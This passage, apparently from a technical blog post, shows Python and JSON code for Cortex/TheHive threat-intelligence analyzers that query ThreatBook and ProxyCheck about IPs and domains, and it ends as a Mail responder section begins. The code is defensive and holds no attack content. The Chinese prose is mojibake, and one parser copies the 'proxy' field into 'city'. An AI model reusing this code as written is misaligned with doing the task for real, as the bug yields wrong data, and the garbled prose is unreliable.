class="string">&#x27;8.8.8.8&#x27;</span></span><br><span class="line">    r = threat.get_reputation(ioc)</span><br><span class="line">    <span class="comment"># compromise</span></span><br><span class="line">    ioc = <span class="string">&#x27;zzv.no-ip.info&#x27;</span></span><br><span class="line">    r = threat.get_compromise(ioc)</span><br><span class="line">    <span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure>

<ul>
<li><em><strong>threatbook_analyzer.py</strong></em></li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> threatbook <span class="keyword">import</span> ThreatBook</span><br><span class="line"><span class="keyword">from</span> cortexutils.analyzer <span class="keyword">import</span> Analyzer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreatBookAnalyzer</span>(<span class="params">Analyzer</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        Analyzer.__init__(self)</span><br><span class="line">        self.service = self.get_param(</span><br><span class="line">            <span class="string">&#x27;config.service&#x27;</span>, <span class="literal">None</span>, <span class="string">&#x27;Service parameter is missing&#x27;</span>)</span><br><span class="line">        self.key = self.get_param(</span><br><span class="line">            <span class="string">&#x27;config.key&#x27;</span>, <span class="literal">None</span>, <span class="string">&#x27;Missing ThreatBook API key&#x27;</span>)</span><br><span class="line">        self.polling_interval = self.get_param(<span class="string">&#x27;config.polling_interval&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">        self.threatbook = ThreatBook(self.key)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">summary</span>(<span class="params">self, raw</span>):</span></span><br><span class="line">        taxonomies = []</span><br><span class="line">        level = <span class="string">&quot;info&quot;</span></span><br><span class="line">        namespace = <span class="string">&quot;ThreatBook&quot;</span></span><br><span class="line">        value = <span class="string">&quot;False&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> self.service == <span class="string">&#x27;reputation&#x27;</span>:</span><br><span class="line">            predicate = <span class="string">&#x27;Reputation&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> self.service == <span class="string">&#x27;compromise&#x27;</span>:</span><br><span class="line">            predicate = <span class="string">&#x27;Compromise&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> raw:</span><br><span class="line">            <span class="keyword">if</span> raw[<span class="string">&#x27;malicious&#x27;</span>] == <span class="literal">True</span>:</span><br><span class="line">                level = <span class="string">&quot;malicious&quot;</span></span><br><span class="line">                value = <span class="string">&quot;True&quot;</span></span><br><span class="line"></span><br><span class="line">        taxonomies.append(self.build_taxonomy(</span><br><span class="line">            level, namespace, predicate, value))</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;taxonomies&quot;</span>: taxonomies&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.service == <span class="string">&#x27;reputation&#x27;</span>:</span><br><span class="line">            data = self.get_param(<span class="string">&#x27;data&#x27;</span>, <span class="literal">None</span>, <span class="string">&#x27;Data is missing&#x27;</span>)</span><br><span class="line">            results = self.threatbook.get_reputation(data)</span><br><span class="line">            self.report(results)</span><br><span class="line">        <span class="keyword">elif</span> self.service == <span class="string">&#x27;compromise&#x27;</span>:</span><br><span class="line">            data = self.get_param(<span class="string">&#x27;data&#x27;</span>, <span class="literal">None</span>, <span class="string">&#x27;Data is missing&#x27;</span>)</span><br><span class="line">            results = self.threatbook.get_compromise(data)</span><br><span class="line">            self.report(results)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.error(<span class="string">&#x27;Invalid data type&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    ThreatBookAnalyzer().run()</span><br></pre></td></tr></table></figure>

<ul>
<li><em><strong>ThreatBook_Compromise.json</strong></em></li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ThreatBook_Compromise&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;1.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;author&quot;</span>: <span class="string">&quot;Canon&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;https://github.com/TheHive-Project/Cortex-Analyzers&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;license&quot;</span>: <span class="string">&quot;AGPL-V3&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;Get the compromise information of IPã€Domain from ThreatBook.&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;dataTypeList&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;ip&quot;</span>,</span><br><span class="line">        <span class="string">&quot;domain&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;ThreatBook/threatbook_analyzer.py&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;baseConfig&quot;</span>: <span class="string">&quot;ThreatBook&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;config&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;service&quot;</span>: <span class="string">&quot;compromise&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;configurationItems&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;key&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;API key for ThreatBook&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;multi&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">&quot;required&quot;</span>: <span class="literal">true</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;polling_interval&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;Define time interval between two requests attempts for the report&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;number&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;multi&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">&quot;required&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">&quot;defaultValue&quot;</span>: <span class="number">60</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>ThreatBook_Reputation.json</strong></li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ThreatBook_Reputation&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;1.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;author&quot;</span>: <span class="string">&quot;Canon&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;https://github.com/TheHive-Project/Cortex-Analyzers&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;license&quot;</span>: <span class="string">&quot;AGPL-V3&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;Get the reputation information of IP from ThreatBook.&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;dataTypeList&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;ip&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;ThreatBook/threatbook_analyzer.py&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;baseConfig&quot;</span>: <span class="string">&quot;ThreatBook&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;config&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;service&quot;</span>: <span class="string">&quot;reputation&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;configurationItems&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;key&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;API key for ThreatBook&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;multi&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">&quot;required&quot;</span>: <span class="literal">true</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;polling_interval&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;Define time interval between two requests attempts for the report&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;number&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;multi&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">&quot;required&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">&quot;defaultValue&quot;</span>: <span class="number">60</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ProxyCheck"><a href="#ProxyCheck" class="headerlink" title="ProxyCheck"></a>ProxyCheck</h4><ul>
<li><em><strong>proxycheck.py</strong></em></li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyCheckError</span>(<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, message</span>):</span></span><br><span class="line">        Exception.__init__(self, message)</span><br><span class="line">        self.message = message</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyCheck</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Threat intelligence: ProxyCheck</span></span><br><span class="line"><span class="string">    http://proxycheck.io/v2/</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, key</span>):</span></span><br><span class="line">        self.key = key</span><br><span class="line">        self.ua = <span class="string">&quot;HappyHunting&quot;</span></span><br><span class="line">        self.session = requests.Session()</span><br><span class="line">        self.url = <span class="string">&#x27;http://proxycheck.io/v2/&#x27;</span></span><br><span class="line">        self.params = &#123;</span><br><span class="line">            <span class="string">&#x27;vpn&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;asn&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;time&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;info&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;risk&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="string">&#x27;port&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;seen&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;days&#x27;</span>: <span class="number">7</span>, <span class="string">&#x27;tag&#x27;</span>: <span class="string">&#x27;siem&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_request</span>(<span class="params">self, url, params=&#123;&#125;</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Request ProxyCheck API</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: self.ua&#125;</span><br><span class="line">        r = self.session.get(</span><br><span class="line">            url=url,</span><br><span class="line">            params=params,</span><br><span class="line">            headers=headers</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> r.status_code != <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">raise</span> ProxyCheckError(</span><br><span class="line">                <span class="string">&#x27;Invalid HTTP status code %i&#x27;</span> % r.status_code)</span><br><span class="line">        <span class="keyword">return</span> r.json()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_proxy</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Checking proxy information from proxycheck.io</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        url = self.url + data</span><br><span class="line">        self.params[<span class="string">&#x27;key&#x27;</span>] = self.key</span><br><span class="line">        results = self._request(url=url, params=self.params)</span><br><span class="line">        <span class="keyword">return</span> self.parser_results(results, data)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parser_results</span>(<span class="params">self, r, ioc</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Parsing results</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        intel = &#123;&#125;</span><br><span class="line">        <span class="keyword">if</span> r[<span class="string">&#x27;status&#x27;</span>] == <span class="string">&#x27;ok&#x27;</span>:</span><br><span class="line">            intel = &#123;</span><br><span class="line">                <span class="string">&#x27;ip&#x27;</span>: ioc,</span><br><span class="line">                <span class="string">&#x27;country&#x27;</span>: r[ioc][<span class="string">&#x27;country&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;city&#x27;</span>: r[ioc][<span class="string">&#x27;proxy&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;proxy&#x27;</span>: r[ioc][<span class="string">&#x27;proxy&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;type&#x27;</span>: r[ioc][<span class="string">&#x27;type&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;provider&#x27;</span>: r[ioc][<span class="string">&#x27;provider&#x27;</span>]</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">return</span> intel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    key = <span class="string">&#x27;&lt;api_key&gt;&#x27;</span></span><br><span class="line">    proxycheck = ProxyCheck(key)</span><br><span class="line"></span><br><span class="line">    ioc = <span class="string">&#x27;8.8.8.8&#x27;</span></span><br><span class="line">    r = proxycheck.check_proxy(ioc)</span><br><span class="line">    <span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure>

<ul>
<li><em><strong>proxycheck_analyzer.py</strong></em></li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> proxycheck <span class="keyword">import</span> ProxyCheck</span><br><span class="line"><span class="keyword">from</span> cortexutils.analyzer <span class="keyword">import</span> Analyzer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyCheckAnalyzer</span>(<span class="params">Analyzer</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        Analyzer.__init__(self)</span><br><span class="line">        self.service = self.get_param(</span><br><span class="line">            <span class="string">&#x27;config.service&#x27;</span>, <span class="literal">None</span>, <span class="string">&#x27;Service parameter is missing&#x27;</span>)</span><br><span class="line">        self.key = self.get_param(</span><br><span class="line">            <span class="string">&#x27;config.key&#x27;</span>, <span class="literal">None</span>, <span class="string">&#x27;Missing ProxyCheck API key&#x27;</span>)</span><br><span class="line">        self.polling_interval = self.get_param(<span class="string">&#x27;config.polling_interval&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">        self.proxycheck = ProxyCheck(self.key)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">summary</span>(<span class="params">self, raw</span>):</span></span><br><span class="line">        taxonomies = []</span><br><span class="line">        level = <span class="string">&quot;info&quot;</span></span><br><span class="line">        namespace = <span class="string">&quot;ProxyCheck&quot;</span></span><br><span class="line">        predicate = <span class="string">&quot;Proxy&quot;</span></span><br><span class="line">        value = <span class="string">&quot;False&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> raw.get(<span class="string">&quot;proxy&quot;</span>) == <span class="string">&quot;yes&quot;</span>:</span><br><span class="line">            level = <span class="string">&quot;suspicious&quot;</span></span><br><span class="line">            value = <span class="string">&quot;True&quot;</span></span><br><span class="line"></span><br><span class="line">        taxonomies.append(self.build_taxonomy(</span><br><span class="line">            level, namespace, predicate, value))</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;taxonomies&quot;</span>: taxonomies&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.service == <span class="string">&#x27;proxycheck&#x27;</span>:</span><br><span class="line">            data = self.get_param(<span class="string">&#x27;data&#x27;</span>, <span class="literal">None</span>, <span class="string">&#x27;Data is missing&#x27;</span>)</span><br><span class="line">            results = self.proxycheck.check_proxy(data)</span><br><span class="line">            self.report(results)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.error(<span class="string">&#x27;Invalid data type&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    ProxyCheckAnalyzer().run()</span><br></pre></td></tr></table></figure>

<ul>
<li><em><strong>ProxyCheck.json</strong></em></li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProxyCheck&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;1.0&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;author&quot;</span>: <span class="string">&quot;Canon&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;https://github.com/TheHive-Project/Cortex-Analyzers&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;license&quot;</span>: <span class="string">&quot;AGPL-V3&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;Get the compromise information of IP from ProxyCheck.&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;dataTypeList&quot;</span>: [<span class="string">&quot;ip&quot;</span>],</span><br><span class="line">  <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;ProxyCheck/proxycheck_analyzer.py&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;baseConfig&quot;</span>: <span class="string">&quot;ProxyCheck&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;config&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;service&quot;</span>: <span class="string">&quot;proxycheck&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;configurationItems&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;key&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;API key for ProxyCheck&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;multi&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;required&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;polling_interval&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;Define time interval between two requests attempts for the report&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;number&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;multi&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;required&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;defaultValue&quot;</span>: <span class="number">60</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Responders-æ’ä»¶"><a href="#Responders-æ’ä»¶" class="headerlink" title="Responders - æ’ä»¶"></a>Responders - æ’ä»¶</h3><h4 id="Mail"><a href="#Mail" class="headerlink" title="Mail"></a>Mail</h4><p>â€‹    <em>Cortex</em>é»˜è®¤æœ‰ä¸€ä¸ªæ’ä»¶ï¼ˆ<em>Mailer</em>ï¼‰è´Ÿè´£å‘é€é‚®ä»¶ã€‚ä½¿ç”¨äº†ä¸€ä¸‹å‘ç°æ¯”è¾ƒâ€œå‘â€ï¼Œé¦–å…ˆä¸æ”¯æŒå¯¹å¤šä¸ªæ”¶ä»¶äººçš„å‘é€ï¼Œä¸”å½“é€‰æ‹©ä»<em>Observables</em>ä¸­å‘é€é‚®ä»¶æ—¶ï¼Œæ”¶ä»¶äººç«Ÿç„¶æ˜¯<em>mail</em>ç±»å‹çš„<em>IoC</em>ã€‚ã€‚ã€‚ WTFï¼åˆ«é—®æˆ‘æ€ä¹ˆçŸ¥é“çš„ï¼Œå®ƒæºç é‡Œå°±æ˜¯è¿™ä¹ˆå†™çš„ã€‚ã€‚ã€‚æ‰€ä»¥ï¼Œè‡ªå·±åŠ¨æ‰‹ä¸°è¡£è¶³é£Ÿï¼</p>
<p><strong>ä¸»è¦åŠŸèƒ½ï¼š</strong></p>
<ol>
<li>åœ¨åŸæœ‰çš„åŸºç¡€ä¸Šæ–°å¢äº†æ‰¹é‡å‘é€çš„åŠŸèƒ½ï¼›</li>
<li>æ–°å¢äº†æ”¯æŒå¯¹<em>task logs</em>æ•°æ®ç±»å‹çš„å‘é€ï¼›</li>
<li>å‘é€é‚®ä»¶æ—¶ä¼šé™„å¸¦å½“å‰<em>case</em>æˆ–è€…<em>task</em>çš„<em>URL</em>ï¼Œä¾¿äºæ”¶ä»¶äººå¿«é€Ÿæµè§ˆé—®é¢˜ï¼›    </li>
</ol>
<ul>
<li><em>mail.py</em></li>
</ul>
